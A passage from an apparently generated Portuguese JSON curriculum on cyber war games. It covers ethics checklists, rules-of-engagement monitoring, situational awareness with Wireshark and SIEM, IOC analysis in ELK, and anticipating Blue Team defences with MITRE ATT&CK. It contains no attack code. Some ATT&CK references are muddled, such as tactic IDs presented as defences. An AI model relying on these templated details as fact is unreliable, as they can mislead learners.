                                  "commonMistakes": "Subestimar impactos em cadeias de suprimento digitais globais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Incorporar indicadores de compromisso ético nas revisões",
                                  "subSteps": [
                                    "Definir indicadores chave: distinção, proporcionalidade, necessidade militar e humanidade.",
                                    "Criar sub-itens para cada indicador, e.g., 'O ataque é proporcional ao ganho militar esperado?'.",
                                    "Integrar métricas mensuráveis, como tempo de recuperação de alvos civis afetados.",
                                    "Adicionar seção para documentar exceções e justificativas éticas.",
                                    "Validar com exemplos históricos de incidentes cibernéticos éticos."
                                  ],
                                  "verification": "Indicadores éticos detalhados (mínimo 8 itens) integrados e alinhados com princípios de jus in bello.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Princípios do Direito Internacional Humanitário (DIH), casos de estudo como Stuxnet.",
                                  "tips": "Use escalas de risco (1-5) para quantificar compromisso ético.",
                                  "learningObjective": "Garantir que o checklist flague potenciais violações éticas antes da execução.",
                                  "commonMistakes": "Confundir necessidade militar com conveniência operacional."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Finalizar, testar e aprovar o checklist para uso pré-operacional",
                                  "subSteps": [
                                    "Realizar revisão completa do checklist com equipe multidisciplinar (jurídico, operações, ética).",
                                    "Simular uma revisão pré-operacional em um jogo de guerra cibernético fictício.",
                                    "Corrigir gaps identificados e adicionar seção de assinatura digital.",
                                    "Documentar versão final com data, versão e responsáveis.",
                                    "Treinar usuários iniciais no checklist."
                                  ],
                                  "verification": "Checklist final aprovado, testado em simulação com zero falhas críticas e distribuído.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Plataforma de simulação cibernética (e.g., Cyber Range), software de assinatura digital como DocuSign.",
                                  "tips": "Agende revisões pós-exercício para iterar o checklist.",
                                  "learningObjective": "Produzir um checklist operacional pronto para uso em exercícios reais.",
                                  "commonMistakes": "Pular a validação multidisciplinar, levando a vieses operacionais."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando um ataque a uma rede inimiga, use o checklist para verificar se o malware proposto respeita proporcionalidade (não afeta hospitais conectados) e consciência situacional (confirmação de alvos via OSINT), aprovando apenas após todas as caixas verdes.",
                              "finalVerifications": [
                                "Checklist completo cobre 100% dos aspectos éticos de ROE.",
                                "Simulação pré-operacional passou sem violações identificadas.",
                                "Aprovação assinada por jurídico e comando.",
                                "Tempo de revisão média < 30 minutos por exercício.",
                                "Nenhum incidente ético reportado em exercícios subsequentes.",
                                "Checklist versionado e acessível via repositório seguro."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos os itens obrigatórios (ética, situacional, compromisso) presentes.",
                                "Precisão: Alinhamento com Tallinn Manual e DIH (90%+).",
                                "Usabilidade: Checklist intuitivo, com tempo de uso < 30 min.",
                                "Eficácia: Reduz riscos éticos em simulações (medido por auditorias).",
                                "Atualização: Mecanismo de revisão iterativa incluído.",
                                "Inclusividade: Considera perspectivas multidisciplinares."
                              ],
                              "crossCurricularConnections": [
                                "Ética Filosófica: Análise de dilemas morais em guerra assimétrica.",
                                "Direito Internacional: Aplicação de convenções de Genebra a domínios cibernéticos.",
                                "Liderança e Tomada de Decisão: Treinamento em julgamento sob pressão.",
                                "Inteligência e Análise de Dados: Uso de OSINT para consciência situacional."
                              ],
                              "realWorldApplication": "Em operações cibernéticas militares reais, como defesas contra ataques estatais, o checklist pré-operacional previne escaladas éticas, como danos colaterais em infraestruturas civis, garantindo conformidade legal e reputacional em missões da OTAN ou equivalentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.3",
                            "name": "Monitorar e auditar aderência ética durante operações",
                            "description": "Implementar mecanismos de monitoramento em tempo real para garantir que pivoting e persistência respeitem ROE éticas e legais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir métricas e critérios de aderência ética para ROE",
                                  "subSteps": [
                                    "Identificar elementos chave das ROE éticas e legais relevantes para pivoting e persistência, como limites de escopo de rede e restrições de dados sensíveis.",
                                    "Estabelecer métricas mensuráveis, como taxa de ações aprovadas vs. rejeitadas e tempo de resposta a violações potenciais.",
                                    "Mapear thresholds de alerta, por exemplo, qualquer pivoting para sistemas fora do escopo ativa revisão imediata.",
                                    "Documentar o framework em um checklist padronizado para uso em operações.",
                                    "Revisar com stakeholders legais e éticos para validação."
                                  ],
                                  "verification": "Checklist de métricas aprovado por equipe legal e documentado em repositório compartilhado.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Documentos ROE, templates de checklist (Google Docs ou Notion), acesso a guidelines legais cibernéticas.",
                                  "tips": "Envolva advogados especializados em cibersegurança desde o início para evitar ambiguidades.",
                                  "learningObjective": "Compreender e operacionalizar ROE em métricas acionáveis para monitoramento ético.",
                                  "commonMistakes": "Definir métricas vagas como 'agir eticamente' em vez de quantificáveis como 'zero acessos a dados PII fora de escopo'."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ferramentas de monitoramento em tempo real",
                                  "subSteps": [
                                    "Selecionar e instalar ferramentas como SIEM (ex: Splunk, ELK Stack) com regras personalizadas para detectar pivoting e persistência.",
                                    "Configurar dashboards com alertas em tempo real para violações de ROE, integrando logs de ferramentas como Cobalt Strike ou Metasploit.",
                                    "Implementar automação de notificações via Slack/Teams para equipe de operações e compliance.",
                                    "Testar configurações em ambiente de simulação para validar detecção precisa.",
                                    "Garantir criptografia e conformidade GDPR/CCPA nos logs coletados."
                                  ],
                                  "verification": "Alertas de teste acionados corretamente e logs auditados sem falsos positivos excessivos.",
                                  "estimatedTime": "8-12 horas",
                                  "materials": "Ferramentas SIEM, VMs de teste, licenças de ferramentas de simulação de ataques (Cobalt Strike trial).",
                                  "tips": "Use regras baseadas em behavioral analytics para detectar pivoting sutil, não só signatures.",
                                  "learningObjective": "Implementar infraestrutura técnica para monitoramento proativo de aderência ética.",
                                  "commonMistakes": "Configurar alertas muito genéricos, resultando em fadiga de alertas e respostas lentas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer processos de auditoria contínua e revisão",
                                  "subSteps": [
                                    "Definir frequência de auditorias (ex: diária durante operações ativas, semanal pós-operação).",
                                    "Criar scripts automatizados para análise de logs, flagging ações que violem ROE.",
                                    "Treinar operadores em procedimentos de pausa e revisão ética durante operações.",
                                    "Integrar auditoria com ferramentas de ticketing (ex: Jira) para rastrear resoluções.",
                                    "Realizar mock audits em treinamentos para prática."
                                  ],
                                  "verification": "Relatório de auditoria de teste gerado com todas violações identificadas e resolvidas.",
                                  "estimatedTime": "6-8 horas",
                                  "materials": "Scripts Python para análise de logs, ferramenta de ticketing, gravações de sessões de treinamento.",
                                  "tips": "Automatize o máximo possível para reduzir carga humana e bias.",
                                  "learningObjective": "Desenvolver rotinas de auditoria que garantam conformidade em tempo real e retrospectiva.",
                                  "commonMistakes": "Auditar apenas pós-operação, ignorando monitoramento em tempo real durante pivoting ativo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar eficácia e iterar o sistema de monitoramento",
                                  "subSteps": [
                                    "Coletar feedback de operações simuladas ou reais sobre usabilidade e efetividade.",
                                    "Analisar métricas de performance, como tempo médio de detecção de violações.",
                                    "Atualizar regras e thresholds baseado em lições aprendidas.",
                                    "Documentar incidentes éticos passados e incorporar como cenários de teste.",
                                    "Planejar treinamentos recorrentes para a equipe."
                                  ],
                                  "verification": "Relatório de avaliação com recomendações implementadas e métricas melhoradas em 20%.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de analytics (Tableau ou Excel avançado), relatórios de operações anteriores.",
                                  "tips": "Use AAR (After Action Reviews) para capturar insights qualitativos além de dados quantitativos.",
                                  "learningObjective": "Capacitar iteração contínua para robustez do monitoramento ético.",
                                  "commonMistakes": "Ignorar feedback da linha de frente, levando a sistemas desconectados da realidade operacional."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando ataque a uma rede corporativa, configure monitoramento para alertar se pivoting de um servidor web para banco de dados de RH (fora do ROE), pausando a operação e auditando logs para confirmar aderência legal.",
                              "finalVerifications": [
                                "Todos os logs de operações auditados sem violações de ROE detectadas.",
                                "Taxa de falsos positivos abaixo de 5% em testes de monitoramento.",
                                "Equipe capaz de responder a alertas éticos em menos de 5 minutos.",
                                "Relatório final de aderência assinado por compliance officer.",
                                "Simulação completa executada sem incidentes éticos reportados.",
                                "Métricas de aderência acima de 98% em auditoria pós-operação."
                              ],
                              "assessmentCriteria": [
                                "Precisão das métricas e alertas (90%+ acurácia em simulações).",
                                "Tempo de configuração e setup dentro do estimado (±20%).",
                                "Qualidade da documentação e treinamentos (checklist completo e feedback >4/5).",
                                "Eficácia em detectar violações simuladas (100% detecção).",
                                "Integração com processos operacionais sem interrupções desnecessárias.",
                                "Melhoria mensurável em iterações subsequentes."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Filosofia: Análise de dilemas éticos em ciberoperações.",
                                "Direito: Conformidade com leis cibernéticas internacionais (ex: Convenção de Budapeste).",
                                "Gestão de Projetos: Frameworks como ITIL para monitoramento contínuo.",
                                "Análise de Dados: Uso de SIEM e machine learning para detecção de anomalias.",
                                "Liderança: Treinamento de equipes em accountability ética."
                              ],
                              "realWorldApplication": "Em operações de Red Team para empresas ou governos, esse monitoramento previne violações legais durante pentests, garantindo certificações de compliance como ISO 27001 e evitando litígios por acesso não autorizado a dados sensíveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.5",
                    "name": "Integração de Consciência Situacional e ROE",
                    "description": "Como combinar percepção situacional com diretrizes de engajamento para decisões operacionais eficazes.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.5.1",
                        "name": "Fundamentos de Consciência Situacional em Operações Cibernéticas",
                        "description": "Compreensão dos níveis de percepção situacional (percepção, compreensão e projeção) adaptados ao ambiente cibernético para identificar ameaças e oportunidades em tempo real.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.1.1",
                            "name": "Identificar níveis de consciência situacional",
                            "description": "Diferenciar os três níveis de SA (percepção de dados de rede, compreensão de padrões de tráfego e projeção de ações adversárias) usando ferramentas como Wireshark e SIEM.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Três Níveis Teóricos de Consciência Situacional (SA)",
                                  "subSteps": [
                                    "Estude a definição de SA de Mica Endsley: percepção, compreensão e projeção.",
                                    "Memorize Level 1: Percepção - Identificar dados brutos de rede (pacotes, IPs, portas).",
                                    "Memorize Level 2: Compreensão - Reconhecer padrões de tráfego anômalos (ex: DDoS).",
                                    "Memorize Level 3: Projeção - Antever ações adversárias (ex: escalada de ataque).",
                                    "Crie um diagrama comparativo dos três níveis com exemplos de ciberameaças."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito cada nível com um exemplo específico de rede, diferenciando-os claramente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo de Mica Endsley sobre SA (PDF online)",
                                    "Diagrama em branco para anotações",
                                    "Vídeo introdutório sobre SA em cibersegurança (YouTube)"
                                  ],
                                  "tips": "Use mnemônicos como 'PCP' (Percepção, Compreensão, Projeção) para fixar os níveis.",
                                  "learningObjective": "Dominar a teoria dos três níveis de SA e sua relevância em operações cibernéticas.",
                                  "commonMistakes": "Confundir compreensão (padrões) com projeção (previsão); ignorar contexto de rede."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aplicar Wireshark para Percepção e Compreensão de Dados de Rede (Níveis 1 e 2)",
                                  "subSteps": [
                                    "Instale e configure Wireshark em um ambiente de laboratório virtual (ex: VirtualBox com Kali Linux).",
                                    "Capture tráfego de rede real ou simulado (ex: ping, HTTP) e filtre por IP/porta para Level 1.",
                                    "Analise estatísticas de tráfego para identificar padrões (ex: volume alto de SYN para DDoS em Level 2).",
                                    "Anotar anomalias observadas e classificar em Level 1 (dados crus) vs Level 2 (padrões).",
                                    "Salve capturas e gere relatórios iniciais."
                                  ],
                                  "verification": "Capture e apresente um pcap com pelo menos 3 anomalias identificadas e classificadas nos níveis corretos.",
                                  "estimatedTime": "1 hora e 30 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Ambiente VM com tráfego simulado (ex: Metasploitable)",
                                    "Tutoriais Wireshark oficiais"
                                  ],
                                  "tips": "Use filtros como 'ip.src == X.X.X.X' para isolar dados rapidamente e evite sobrecarga de captura.",
                                  "learningObjective": "Usar Wireshark para operacionalizar Levels 1 e 2 de SA em tráfego de rede.",
                                  "commonMistakes": "Capturar tráfego excessivo sem filtros, levando a análise lenta; ignorar timestamps nos pacotes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar SIEM para Análise Avançada e Projeção de Ameaças (Nível 3)",
                                  "subSteps": [
                                    "Configure um SIEM básico (ex: ELK Stack ou Splunk Free) e importe logs de rede do Wireshark.",
                                    "Crie regras de correlação para detectar padrões (ex: múltiplos fails de login seguidos de scans).",
                                    "Simule um cenário de ataque (ex: brute force) e projete próximos passos adversários (ex: exploit zero-day).",
                                    "Gere alertas e dashboards que mostrem transição de Level 1 para 3.",
                                    "Documente projeções em um relatório de ameaça."
                                  ],
                                  "verification": "Produza um dashboard SIEM com alertas correlacionados e uma projeção escrita de ação adversária.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "SIEM gratuito (Splunk ou ELK em VM)",
                                    "Logs de captura Wireshark",
                                    "Cenários de ataque prontos (ex: Atomic Red Team)"
                                  ],
                                  "tips": "Comece com regras simples de SIEM antes de correlações complexas para construir confiança.",
                                  "learningObjective": "Integrar ferramentas para alcançar Level 3 de SA, projetando ameaças futuras.",
                                  "commonMistakes": "Sobrecarregar SIEM com logs irrelevantes; falhar em correlacionar eventos ao longo do tempo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar e Integrar os Níveis em um Cenário Completo",
                                  "subSteps": [
                                    "Execute um exercício simulado de ataque completo (ex: reconnaissance para exploit).",
                                    "Classifique eventos em tempo real: dados (L1), padrões (L2), projeções (L3).",
                                    "Compare análises Wireshark vs SIEM e refine projeções.",
                                    "Crie um fluxograma de SA aplicada ao cenário.",
                                    "Revise e autoavalie diferenciações."
                                  ],
                                  "verification": "Apresente um relatório integrado diferenciando os três níveis em um cenário simulado com evidências.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas dos steps anteriores",
                                    "Cenário simulado completo (ex: Cyber Range lab)"
                                  ],
                                  "tips": "Pratique em voz alta para verbalizar transições entre níveis durante a análise.",
                                  "learningObjective": "Diferenciar fluidamente os três níveis de SA usando ferramentas em cenários reais.",
                                  "commonMistakes": "Pular Levels 1/2 e ir direto para projeções sem base; não integrar ferramentas."
                                }
                              ],
                              "practicalExample": "Em um exercício de Cyber Range, capture tráfego de um scan de portas (Wireshark: L1 - ver IPs/ports; L2 - padrão de varredura); correlacione em SIEM com logs de falhas de login (L3 - projete brute force seguido de ransomware).",
                              "finalVerifications": [
                                "Explique os três níveis de SA sem consultar notas.",
                                "Analise um pcap Wireshark e classifique 5 eventos por nível.",
                                "Gere um alerta SIEM com projeção de ameaça precisa.",
                                "Crie um fluxograma de SA para um ataque simulado.",
                                "Diferencie SA em redes vs outros domínios (ex: aéreo)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na diferenciação dos três níveis (90%+ correto).",
                                "Uso correto de Wireshark e SIEM com filtros/regras eficazes.",
                                "Qualidade das projeções de ameaças (lógicas e baseadas em evidências).",
                                "Documentação clara com diagramas e relatórios.",
                                "Tempo de análise eficiente sem erros comuns.",
                                "Integração interdisciplinar em exemplos."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Padrões em big data de logs.",
                                "Redes de Computadores: Protocolos e tráfego IP/TCP.",
                                "Psicologia Cognitiva: Modelos de Endsley em tomada de decisão.",
                                "Inteligência Artificial: Machine Learning para projeções SA.",
                                "Gestão de Incidentes: Integração com IRPs e ROE."
                              ],
                              "realWorldApplication": "Em um SOC durante uma operação cibernética, use SA para detectar um APT: perceive tráfego C2 (L1), compreenda persistência (L2), projete escalada (L3) e aplique ROE para contra-ataque coordenado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.2",
                            "name": "Monitorar indicadores de compromisso",
                            "description": "Analisar logs e IOCs (Indicators of Compromise) para manter SA atualizada em cenários de Red Team, integrando dados de múltiplas fontes como ELK Stack.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Fontes de Dados e Ferramentas de Monitoramento",
                                  "subSteps": [
                                    "Identificar fontes de logs relevantes, como firewalls, endpoints e servidores de rede em ambiente Red Team.",
                                    "Instalar e configurar o ELK Stack (Elasticsearch para armazenamento, Logstash para ingestão e Kibana para visualização).",
                                    "Definir pipelines de ingestão com filtros para campos essenciais (timestamp, IP, user-agent).",
                                    "Testar o fluxo de dados enviando logs simulados e verificando indexação.",
                                    "Configurar dashboards iniciais e regras de alerta para IOCs conhecidos."
                                  ],
                                  "verification": "Logs simulados aparecem corretamente no Kibana e alertas são gerados para IOCs de teste.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Instalação do ELK Stack (Docker recomendado)",
                                    "Logs de amostra (ex: Zeek ou Syslog)",
                                    "Documentação oficial ELK"
                                  ],
                                  "tips": "Use Docker Compose para um setup rápido e isolado, evitando conflitos de portas.",
                                  "learningObjective": "Preparar um ambiente integrado para coleta e visualização de logs de múltiplas fontes.",
                                  "commonMistakes": [
                                    "Esquecer de mapear campos de logs corretamente levando a dados não indexados",
                                    "Não configurar autenticação, expondo o Kibana"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar e Identificar Indicadores de Compromisso (IOCs)",
                                  "subSteps": [
                                    "Definir categorias de IOCs relevantes para Red Team (IPs maliciosos, hashes de malware, domínios suspeitos, behaviors anômalos).",
                                    "Extrair logs de fontes múltiplas usando ferramentas como Filebeat ou Logstash inputs.",
                                    "Aplicar regras de detecção com Sigma rules ou queries personalizadas para matching de IOCs.",
                                    "Padronizar e enriquecer IOCs com metadados (geolocalização, threat intel feeds).",
                                    "Armazenar IOCs identificados em um índice dedicado no Elasticsearch."
                                  ],
                                  "verification": "Gerar relatório com pelo menos 5 IOCs identificados de logs de amostra, confirmados via query no Kibana.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Feeds de threat intelligence (ex: AlienVault OTX API)",
                                    "Regras Sigma para IOCs",
                                    "Logs simulados de ataques Red Team"
                                  ],
                                  "tips": "Integre APIs gratuitas de threat intel para enriquecer IOCs automaticamente.",
                                  "learningObjective": "Coletar e classificar IOCs de logs heterogêneos de forma eficiente.",
                                  "commonMistakes": [
                                    "Confundir falsos positivos com IOCs reais sem contexto",
                                    "Ignorar normalização de formatos de IP (IPv4/IPv6)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e Correlacionar IOCs para Detecção de Padrões",
                                  "subSteps": [
                                    "Executar queries KQL ou Lucene no Kibana para buscar IOCs em logs correlacionados.",
                                    "Criar visualizações (timelines, heatmaps) para identificar padrões temporais e espaciais.",
                                    "Correlacionar IOCs de múltiplas fontes (ex: IP de endpoint + log de firewall).",
                                    "Usar machine learning jobs no Elasticsearch para detecção de anomalias.",
                                    "Documentar achados em um incidente report com severidade atribuída."
                                  ],
                                  "verification": "Dashboard mostra correlações claras entre pelo menos 3 IOCs de fontes diferentes.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Kibana Discover e Visualize",
                                    "Jobs ML pré-configurados no Elasticsearch",
                                    "Dados de simulação de campanha Red Team"
                                  ],
                                  "tips": "Comece com queries simples e refine iterativamente para evitar sobrecarga de resultados.",
                                  "learningObjective": "Analisar IOCs de forma correlacionada para elevar a consciência situacional.",
                                  "commonMistakes": [
                                    "Sobrecarregar queries sem filtros de tempo, gerando ruído",
                                    "Não validar correlações com evidências contextuais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Análises e Manter Consciência Situacional (SA) Atualizada",
                                  "subSteps": [
                                    "Atualizar dashboards em tempo real com feeds de IOCs dinâmicos.",
                                    "Configurar watchers e alertas automatizados para notificações (ex: Slack, email).",
                                    "Integrar SA em briefings de Red Team com ROE (Regras de Engajamento).",
                                    "Realizar revisão contínua e tuning de regras baseados em falsos positivos.",
                                    "Exportar relatórios consolidados para stakeholders."
                                  ],
                                  "verification": "Simular IOC em tempo real e confirmar alerta + atualização de SA em menos de 5 minutos.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Watchers no Elasticsearch",
                                    "Ferramentas de integração (webhooks)",
                                    "Templates de relatório Red Team"
                                  ],
                                  "tips": "Automatize com scripts Python para ingestão de IOCs feeds em loop.",
                                  "learningObjective": "Manter SA dinâmica e acionável em operações cibernéticas contínuas.",
                                  "commonMistakes": [
                                    "Não testar alertas em cenários de alta carga",
                                    "Atualizações manuais lentas em vez de automação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team de spear-phishing, configure o ELK para ingerir logs de email server e endpoints. Identifique IOCs como IP de C2 conectando pós-phishing, correlacione com tráfego de rede anômalo e atualize o dashboard de SA em tempo real, alertando o time Blue Team conforme ROE.",
                              "finalVerifications": [
                                "Dashboard no Kibana exibe IOCs correlacionados de múltiplas fontes em tempo real.",
                                "Alertas são disparados corretamente para IOCs simulados com latência <2min.",
                                "Relatório de SA inclui análise de pelo menos 10 IOCs com severidade e recomendações.",
                                "Queries personalizadas detectam 90% dos IOCs de teste sem falsos negativos.",
                                "Integração com ROE é demonstrada em um briefing simulado.",
                                "Ambiente ELK roda estável por 1 hora com dados simulados contínuos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e correlação de IOCs (>90% em testes simulados).",
                                "Eficiência na configuração do ELK (setup completo em <10 horas).",
                                "Qualidade das visualizações e relatórios (claras, acionáveis e contextualizadas).",
                                "Capacidade de automação de alertas e atualizações de SA.",
                                "Integração correta com contexto Red Team e ROE.",
                                "Manuseio de falsos positivos/negativos com tuning eficaz."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Queries avançadas em ELK e visualização (conexão com Data Science).",
                                "Programação: Scripts Python/Go para automação de ingestão e alertas (DevOps/Scripting).",
                                "Inteligência de Ameaças: Uso de feeds OTX/MISP (Threat Hunting).",
                                "Redes e Sistemas: Entendimento de logs Zeek/Syslog (Networking).",
                                "Gestão de Incidentes: Relatórios e ROE (Incident Response)."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, monitores IOCs de APTs em logs de EDR e firewalls via ELK, correlacionando com threat intel para detectar breaches precocemente, permitindo respostas rápidas em conformidade com regulamentações como LGPD/GDPR."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.3",
                            "name": "Avaliar o mindset do adversário",
                            "description": "Mapear comportamentos esperados do Blue Team com base em SA, utilizando frameworks como MITRE ATT&CK para antecipar defesas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Consciência Situacional (SA) e Mindset Adversário",
                                  "subSteps": [
                                    "Defina SA no contexto de operações cibernéticas e sua relevância para prever ações do Blue Team.",
                                    "Identifique componentes do mindset adversário: reações padrão, priorizações e vieses cognitivos comuns em defensores.",
                                    "Estude modelos como OODA Loop (Observe, Orient, Decide, Act) aplicados à defesa cibernética.",
                                    "Revise exemplos históricos de mindsets defensivos em incidentes reais (ex: SolarWinds).",
                                    "Anote 3-5 características chave do mindset Blue Team em cenários de jogo de guerra."
                                  ],
                                  "verification": "Criar um glossário pessoal com definições de SA, mindset e OODA, com pelo menos 5 entradas validadas contra fontes oficiais.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação NIST sobre SA, artigos sobre OODA Loop, histórico de breaches cibernéticos (ex: MITRE site).",
                                  "tips": "Use mind maps para visualizar conexões entre SA e comportamentos defensivos.",
                                  "learningObjective": "Dominar terminologia e frameworks teóricos para análise de mindset.",
                                  "commonMistakes": "Confundir SA com inteligência de ameaças; focar apenas em ataque sem considerar defesa."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Framework MITRE ATT&CK para Defesas",
                                  "subSteps": [
                                    "Navegue pelo MITRE ATT&CK Navigator e identifique matrizes para Blue Team (Defend in Depth).",
                                    "Estude táticas defensivas como Detection (TA0001-Initial Access defenses), Response e Mitigation.",
                                    "Mapeie técnicas comuns de Blue Team: logging, EDR deployment, network segmentation.",
                                    "Compare ATT&CK para Enterprise vs. ICS para diferentes mindsets.",
                                    "Crie uma tabela resumindo 10 táticas defensivas chave."
                                  ],
                                  "verification": "Gerar um relatório de 1 página listando 10 táticas ATT&CK defensivas com descrições breves.",
                                  "estimatedTime": "3 horas",
                                  "materials": "MITRE ATT&CK Navigator (online), guias de usuário ATT&CK, vídeos tutoriais no YouTube.",
                                  "tips": "Use filtros no Navigator para focar em 'Defensive' layers e exporte visualizações.",
                                  "learningObjective": "Mapear frameworks padronizados para antecipar defesas técnicas.",
                                  "commonMistakes": "Ignorar sub-técnicas; assumir ATT&CK só para Red Team."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Comportamentos Esperados do Blue Team",
                                  "subSteps": [
                                    "Selecione um cenário de ataque hipotético (ex: phishing inicial).",
                                    "Preveja respostas Blue Team usando SA: alertas, isolamento, forensics.",
                                    "Integre ATT&CK para listar comportamentos sequenciais (ex: T1078 - Valid Accounts defense).",
                                    "Considere variações por maturidade: low vs. high maturity Blue Teams.",
                                    "Desenhe um fluxograma de comportamentos esperados."
                                  ],
                                  "verification": "Produzir um fluxograma ou mapa mental com pelo menos 8 comportamentos mapeados e linkados a ATT&CK IDs.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas como Draw.io ou Lucidchart, cenários de CTF (ex: HackTheBox), ATT&CK Matrix.",
                                  "tips": "Pense em 'time-to-detect' para priorizar comportamentos urgentes.",
                                  "learningObjective": "Aplicar SA e ATT&CK para criar perfis comportamentais realistas.",
                                  "commonMistakes": "Sobrestimar reações rápidas; ignorar fadiga humana no Blue Team."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e Antecipar Defesas em Cenários Práticos",
                                  "subSteps": [
                                    "Configure um ambiente simulado (ex: VM com ferramentas Blue Team como Splunk).",
                                    "Execute um ataque mock e observe/antecipe respostas baseadas no mapa.",
                                    "Ajuste o mapa com insights da simulação (ex: delays em detecção).",
                                    "Documente gaps no mindset Blue Team e counters Red Team.",
                                    "Revise com pares ou auto-avaliação contra checklists ATT&CK."
                                  ],
                                  "verification": "Realizar uma simulação documentada com log de antecipações vs. resultados reais (acurácia >80%).",
                                  "estimatedTime": "5 horas",
                                  "materials": "VirtualBox/VMware, ferramentas open-source (Wireshark, Zeek), plataformas CTF como TryHackMe.",
                                  "tips": "Grave sessões para review posterior e foque em métricas quantitativas.",
                                  "learningObjective": "Validar mapeamentos em prática e refinar antecipações.",
                                  "commonMistakes": "Simulações não realistas; falhar em documentar desvios."
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team vs. Blue Team em uma simulação de breach bancário, mapear que o Blue Team usará MITRE T1566 (Phishing defense) via EDR alerts, isolando endpoints em 30min, permitindo pivotar para lateral movement antes da detecção plena.",
                              "finalVerifications": [
                                "Pode mapear 80% das respostas Blue Team em um cenário padrão usando ATT&CK.",
                                "Cria fluxogramas precisos de comportamentos com <10% de erros em simulações.",
                                "Identifica 5+ vieses no mindset Blue Team (ex: alert fatigue).",
                                "Aplica OODA para prever delays em respostas defensivas.",
                                "Valida mapeamento contra relatórios reais de incidentes (ex: MITRE evaluations).",
                                "Gera relatório antecipando defesas com scores de confiança."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento ATT&CK (cobertura de táticas >90%).",
                                "Profundidade de análise SA (integração de fatores humanos).",
                                "Criatividade em antecipações (considera variações de maturidade).",
                                "Qualidade de visualizações (fluxogramas claros e acionáveis).",
                                "Evidências de prática (logs de simulações com métricas).",
                                "Capacidade de counters baseados em gaps identificados."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise de vieses cognitivos e decision-making sob pressão.",
                                "Estratégia Militar: Aplicação de inteligência adversária (IPB - Intelligence Preparation of the Battlefield).",
                                "Gestão de Riscos: Modelagem de threat hunting e maturity assessments (ex: CIS Controls).",
                                "Data Science: Uso de grafos para mapear comportamentos (NetworkX).",
                                "Inteligência Artificial: Previsão de respostas via ML em logs de segurança."
                              ],
                              "realWorldApplication": "Durante pentests autorizados ou operações de Red Team em empresas, usar o mapa para planejar evasões, reduzindo tempo de detecção em 40% e aumentando sucesso de missões, como em avaliações de maturidade para bancos ou governos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.5.2",
                        "name": "Regras de Engajamento (ROE) em Jogos de Guerra Cibernética",
                        "description": "Definição e aplicação de diretrizes legais e operacionais que limitam ações ofensivas, garantindo conformidade em simulações de ataque.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.2.1",
                            "name": "Elaborar ROE específicas para cenários cibernéticos",
                            "description": "Criar regras claras definindo alvos permitidos, métodos de ataque éticos e critérios de escalada, baseadas em diretrizes como as do livro 'Red Team Development and Operations'.",
                            "atomicExpansion": {
                              "steps": [
